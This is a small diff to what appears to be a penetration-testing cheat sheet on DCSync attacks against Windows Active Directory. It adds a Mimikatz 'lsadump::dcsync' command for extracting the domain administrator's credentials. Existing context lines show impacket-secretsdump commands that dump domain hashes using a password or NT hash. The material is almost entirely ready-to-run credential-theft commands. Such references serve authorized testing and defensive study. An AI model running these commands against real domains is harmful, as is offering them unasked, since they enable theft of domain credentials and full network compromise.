@@ -19,4 +19,10 @@ impacket-secretsdump -just-dc username:password@10.10.11.10
 impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10
 ```
 
+#### Mimikatz (From Windows)
+
+```powershell
+.\mimikatz.exe 'lsadump::dcsync /domain:EXAMPLE.COM /user:administrator' exit
+```
+
 <br>
